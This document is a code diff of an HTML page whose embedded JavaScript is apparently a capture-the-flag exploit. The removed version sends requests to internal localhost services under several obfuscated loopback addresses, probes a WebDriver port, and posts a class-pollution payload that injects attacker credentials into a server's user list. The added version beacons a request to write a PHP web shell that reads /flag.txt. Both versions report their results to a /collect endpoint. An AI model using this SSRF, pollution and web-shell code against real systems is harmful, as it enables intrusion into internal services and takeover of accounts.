@@ -8,86 +8,27 @@
 <img src="/collect?ping=1" alt="" style="display:none;" />
 <script>
 (async () => {
-  const payload = {
-    machine_id: "host-1492",
-    __class__: {
-      __init__: {
-        __globals__: {
-          USERS: [
-            {
-              username: "lean@tornado-service.htb",
-              password: "SuperSecurePass123!"
-            }
-          ]
-        }
-      }
-    }
-  };
-
-  let status = "error";
-  let body = "";
-  let errorMsg = "";
-  let debug = "";
-  let extra = "";
-
+  const payload = "{\"filename\":\"shell.php\",\"content\":\"<?php echo file_get_contents('/flag.txt'); ?>\"}";
+  const blob = new Blob([payload], { type: "application/json" });
   const targets = [
-    "http://127.0.0.1:1337",
-    "http://2130706433:1337",
-    "http://0x7f000001:1337",
-    "http://0177.0.0.1:1337",
-    "http://localhost:1337",
-    "http://[::1]:1337"
+    "http://127.0.0.1:50000/index.php",
+    "http://localhost:50000/index.php",
+    "http://127.1:50000/index.php",
+    "http://2130706433:50000/index.php",
+    "http://0x7f000001:50000/index.php"
   ];
 
-  for (const base of targets) {
-    try {
-      const resp = await fetch(`${base}/get_tornados`, {
-        method: "GET",
-        mode: "cors",
-        cache: "no-store"
-      });
-      if (resp && resp.ok) {
-        debug = await resp.text();
-        break;
-      }
-    } catch (e) {
-      debug = e && e.message ? e.message : `get_failed_${base}`;
-    }
-  }
+  let status = "failed";
 
-  try {
-    const resp = await fetch("http://127.0.0.1:9515/status", {
-      method: "GET",
-      mode: "cors",
-      cache: "no-store"
-    });
-    if (resp && resp.ok) {
-      extra = await resp.text();
-    }
-  } catch (e) {
-    extra = e && e.message ? e.message : "wd_failed";
-  }
-
-  for (const base of targets) {
-    try {
-      await fetch(`${base}/update_tornado`, {
-        method: "POST",
-        body: JSON.stringify(payload),
-        mode: "no-cors",
-        credentials: "include",
-        cache: "no-store"
-      });
-      status = `sent_${base}`;
-      body = "opaque";
+  for (const url of targets) {
+    if (navigator.sendBeacon(url, blob)) {
+      status = `beacon_${url}`;
       break;
-    } catch (e) {
-      errorMsg = e && e.message ? e.message : `fetch_failed_${base}`;
     }
   }
 
   try {
-    const info = `s=${status}&e=${encodeURIComponent(errorMsg)}&b=${encodeURIComponent(body.slice(0, 120))}&d=${encodeURIComponent(debug.slice(0, 120))}&x=${encodeURIComponent(extra.slice(0, 120))}`;
-    await fetch(`${location.origin}/collect?${info}`);
+    await fetch(`${location.origin}/collect?status=${encodeURIComponent(status)}`);
   } catch (e) {}
 
   document.body.innerHTML = "<h1>Done</h1>";
